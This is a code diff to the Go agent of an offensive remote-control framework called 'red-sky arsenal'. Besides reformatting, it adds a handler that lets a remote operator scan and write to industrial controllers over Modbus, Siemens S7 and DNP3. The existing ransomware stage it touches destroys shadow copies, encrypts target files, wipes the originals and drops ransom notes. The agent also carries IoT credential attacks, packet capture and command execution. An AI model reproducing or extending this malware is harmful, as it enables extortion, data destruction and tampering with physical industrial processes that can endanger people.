@@ -8,8 +8,8 @@ import (
 	"bytes"
 	"context"
 	"crypto/tls"
-	"encoding/binary"
 	"encoding/base64"
+	"encoding/binary"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -26,18 +26,17 @@ import (
 
 	"github.com/sk666G/red-sky---arsenal/internal/agentfw"
 	"github.com/sk666G/red-sky---arsenal/internal/capturer"
-	"github.com/sk666G/red-sky---arsenal/internal/wireless"
 	"github.com/sk666G/red-sky---arsenal/internal/crypto"
+	"github.com/sk666G/red-sky---arsenal/internal/cryptor"
 	"github.com/sk666G/red-sky---arsenal/internal/evade"
+	"github.com/sk666G/red-sky---arsenal/internal/icsgo"
+	"github.com/sk666G/red-sky---arsenal/internal/iotcreds"
 	"github.com/sk666G/red-sky---arsenal/internal/proto"
 	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
 	"github.com/sk666G/red-sky---arsenal/internal/wire"
+	"github.com/sk666G/red-sky---arsenal/internal/wireless"
 	"path/filepath"
-	"github.com/sk666G/red-sky---arsenal/internal/cryptor"
-	"github.com/sk666G/red-sky---arsenal/internal/iotcreds"
 )
-
-
 
 func main() {
 	host := flag.String("host", "127.0.0.1", "core host")
@@ -237,6 +236,13 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			go runIoTCreds(conn, sess, ic)
+		case proto.TypeIcsStart:
+			var is proto.IcsStart
+			if err := json.Unmarshal(env.Payload, &is); err != nil {
+				log.Printf("[ics] unmarshal: %v", err)
+				continue
+			}
+			go runIcs(conn, sess, is)
 		case proto.TypeWirelessStop:
 			var ws proto.WirelessStop
 			if err := json.Unmarshal(env.Payload, &ws); err != nil {
@@ -277,12 +283,12 @@ func collectInfo() proto.AgentInfo {
 		fmt.Sscanf(u.Uid, "%d", &uid)
 	}
 	return proto.AgentInfo{
-		Hostname: hostname,
-		OS:       runtime.GOOS,
-		Arch:     runtime.GOARCH,
-		User:     usr,
-		UID:      uid,
-		PID:      os.Getpid(),
+		Hostname:     hostname,
+		OS:           runtime.GOOS,
+		Arch:         runtime.GOARCH,
+		User:         usr,
+		UID:          uid,
+		PID:          os.Getpid(),
 		Capabilities: []string{"exec", "file_get", "file_put", "tls", "aes-gcm"},
 	}
 }
@@ -335,7 +341,6 @@ func sendEncrypted(conn net.Conn, sess *crypto.Session, t proto.MessageType, pay
 	return wire.WriteFrame(conn, wire.FlagEncrypted, enc)
 }
 
-
 // runFrameworkTask handles a Task with Kind="framework" by dispatching to
 // agentfw, which runs the module natively in the agent process.
 func runFrameworkTask(t proto.Task) proto.Result {
@@ -347,13 +352,17 @@ func runFrameworkTask(t proto.Task) proto.Result {
 	}
 	r := agentfw.Dispatch(ctx, t.Cmd, t.Args)
 	return proto.Result{
-		TaskID:   t.ID,
-		Stdout:   r.Output,
-		Stderr:   func() string { if r.Err != nil { return r.Err.Error() }; return "" }(),
+		TaskID: t.ID,
+		Stdout: r.Output,
+		Stderr: func() string {
+			if r.Err != nil {
+				return r.Err.Error()
+			}
+			return ""
+		}(),
 		ExitCode: r.ExitCode,
 	}
 }
-
 
 // --- tunnels ---
 
@@ -443,7 +452,6 @@ func sendTunnelAck(conn net.Conn, sess *crypto.Session, t proto.MessageType, pay
 	_ = sendEncrypted(conn, sess, t, payload)
 }
 
-
 // --- capture ---
 
 var (
@@ -526,7 +534,6 @@ func stopCapture(sessionID string) {
 	}
 }
 
-
 // --- wireless capture ---
 
 var (
@@ -607,18 +614,17 @@ func stopWireless(sessionID string) {
 		cancel()
 	}
 
-
-// runCrypto drives the crypto_malware stage on the agent. Mirrors runWireless:
-// owns its own goroutine, sends progress over the tunnel, returns on completion.
-//
-// Stage order:
-//   1. KillVSS  — destroy VSS / snapshots if requested
-//   2. Walk     — encrypt every target file under Root
-//   3. Note     — drop the ransom note in hit directories
-//
-// The agent needs an operator public key already on disk at
-// <workdir>/operator.pub.pem — it is fetched over the tunnel before this
-// handler is invoked by a KeyPush message.
+	// runCrypto drives the crypto_malware stage on the agent. Mirrors runWireless:
+	// owns its own goroutine, sends progress over the tunnel, returns on completion.
+	//
+	// Stage order:
+	//  1. KillVSS  — destroy VSS / snapshots if requested
+	//  2. Walk     — encrypt every target file under Root
+	//  3. Note     — drop the ransom note in hit directories
+	//
+	// The agent needs an operator public key already on disk at
+	// <workdir>/operator.pub.pem — it is fetched over the tunnel before this
+	// handler is invoked by a KeyPush message.
 }
 
 func runCrypto(conn net.Conn, sess *crypto.Session, cs proto.CryptoStart) {
@@ -678,8 +684,8 @@ func runCrypto(conn net.Conn, sess *crypto.Session, cs proto.CryptoStart) {
 		bytes int64
 	)
 	opts := cryptor.WalkerOptions{
-		Root:    cs.Root,
-		DryRun:  cs.DryRun,
+		Root:     cs.Root,
+		DryRun:   cs.DryRun,
 		WipeOrig: !cs.DryRun,
 		OnHit: func(path string, size int64) {
 			count++
@@ -789,3 +795,151 @@ func runIoTCreds(conn net.Conn, sess *crypto.Session, ic proto.IoTCredsStart) {
 	send(iotcreds.Hit{}, total, total, len(hits) > 0, true, errStr)
 }
 
+// runIcs drives an ICS protocol operation on the agent. Dispatches by
+// Protocol to the appropriate icsgo primitive and streams progress via
+// IcsData messages. Called via proto.TypeIcsStart.
+func runIcs(conn net.Conn, sess *crypto.Session, ic proto.IcsStart) {
+	send := func(stage, msg, detail string, ok, done bool) {
+		sendTunnelAck(conn, sess, proto.TypeIcsData, proto.IcsData{
+			SessionID: ic.SessionID,
+			Stage:     stage,
+			Message:   msg,
+			Detail:    detail,
+			OK:        ok,
+			Done:      done,
+		})
+	}
+
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+	activeCryptoMu.Lock()
+	activeCrypto[ic.SessionID] = cancel
+	activeCryptoMu.Unlock()
+	defer func() {
+		activeCryptoMu.Lock()
+		delete(activeCrypto, ic.SessionID)
+		activeCryptoMu.Unlock()
+	}()
+
+	switch ic.Protocol {
+	case "modbus":
+		runIcsModbus(ctx, ic, send)
+	case "s7":
+		runIcsS7(ctx, ic, send)
+	case "dnp3":
+		runIcsDNP3(ctx, ic, send)
+	default:
+		send("error", "unknown protocol: "+ic.Protocol, "", false, true)
+		return
+	}
+	send("done", "", "", true, true)
+}
+
+func runIcsModbus(ctx context.Context, ic proto.IcsStart, send func(string, string, string, bool, bool)) {
+	opts := icsgo.MBOptions{Host: ic.Host, Port: ic.Port, Unit: ic.Unit}
+	switch ic.Action {
+	case "scan":
+		alive, err := icsgo.ModbusUnitScan(ic.Host, ic.Port, 1, 247, 0)
+		if err != nil {
+			send("scan", "scan error", err.Error(), false, false)
+			return
+		}
+		send("scan", "units responding", fmt.Sprintf("%v", alive), true, false)
+	case "read":
+		res, err := icsgo.ModbusRead(opts, ic.Func, ic.Start, ic.Count)
+		if err != nil {
+			send("read", "read error", err.Error(), false, false)
+			return
+		}
+		if res.Exception != 0 {
+			send("read", "exception", fmt.Sprintf("code 0x%02x", res.Exception), false, false)
+			return
+		}
+		det := fmt.Sprintf("regs=%v bits=%v", res.Regs, res.Bits)
+		send("read", "ok", det, true, false)
+	case "write":
+		switch ic.Func {
+		case icsgo.MBFuncWriteCoil:
+			res, err := icsgo.ModbusWriteCoil(opts, ic.Start, ic.Bool)
+			if err != nil {
+				send("write", "coil write error", err.Error(), false, false)
+				return
+			}
+			send("write", "coil ok", fmt.Sprintf("exc=%d", res.Exception), res.Exception == 0, false)
+		case icsgo.MBFuncWriteRegister:
+			res, err := icsgo.ModbusWriteRegister(opts, ic.Start, ic.Value)
+			if err != nil {
+				send("write", "reg write error", err.Error(), false, false)
+				return
+			}
+			send("write", "reg ok", fmt.Sprintf("exc=%d", res.Exception), res.Exception == 0, false)
+		case icsgo.MBFuncWriteMultiRegs:
+			res, err := icsgo.ModbusWriteMultiRegs(opts, ic.Start, ic.Values)
+			if err != nil {
+				send("write", "multi write error", err.Error(), false, false)
+				return
+			}
+			send("write", "multi ok", fmt.Sprintf("exc=%d", res.Exception), res.Exception == 0, false)
+		}
+	}
+}
+
+func runIcsS7(ctx context.Context, ic proto.IcsStart, send func(string, string, string, bool, bool)) {
+	c, err := icsgo.S7Connect(icsgo.S7Options{Host: ic.Host, Port: ic.Port})
+	if err != nil {
+		send("connect", "s7 connect error", err.Error(), false, false)
+		return
+	}
+	defer c.Close()
+
+	switch ic.Action {
+	case "info":
+		data, err := c.S7ReadSZL(0x001C)
+		if err != nil {
+			send("info", "szl 0x1C error", err.Error(), false, false)
+			return
+		}
+		send("info", "component id", string(data[:min(len(data), 200)]), true, false)
+	case "read":
+		data, err := c.S7Read(ic.Area, ic.DB, ic.Start, ic.Count)
+		if err != nil {
+			send("read", "read error", err.Error(), false, false)
+			return
+		}
+		send("read", fmt.Sprintf("%d bytes", len(data)), fmt.Sprintf("%x", data), true, false)
+	case "write":
+		if err := c.S7Write(ic.Area, ic.DB, ic.Start, ic.Data); err != nil {
+			send("write", "write error", err.Error(), false, false)
+			return
+		}
+		send("write", "ok", "", true, false)
+	}
+}
+
+func runIcsDNP3(ctx context.Context, ic proto.IcsStart, send func(string, string, string, bool, bool)) {
+	c, err := icsgo.DNP3Connect(icsgo.DNP3Options{
+		Host: ic.Host, Port: ic.Port, Dest: ic.Dest, Src: ic.Src,
+	})
+	if err != nil {
+		send("connect", "dnp3 connect error", err.Error(), false, false)
+		return
+	}
+	defer c.Close()
+
+	var resp icsgo.DNP3Response
+	switch ic.Action {
+	case "integrity":
+		resp, err = c.Integrity()
+	case "poll":
+		resp, err = c.PollClass(ic.Class)
+	default:
+		send("error", "unknown dnp3 action: "+ic.Action, "", false, false)
+		return
+	}
+	if err != nil {
+		send("read", "dnp3 error", err.Error(), false, false)
+		return
+	}
+	det := fmt.Sprintf("fn=0x%02x iin=0x%04x raw=%x", resp.Function, resp.IIN.Raw, resp.Raw)
+	send("read", "ok", det, true, false)
+}
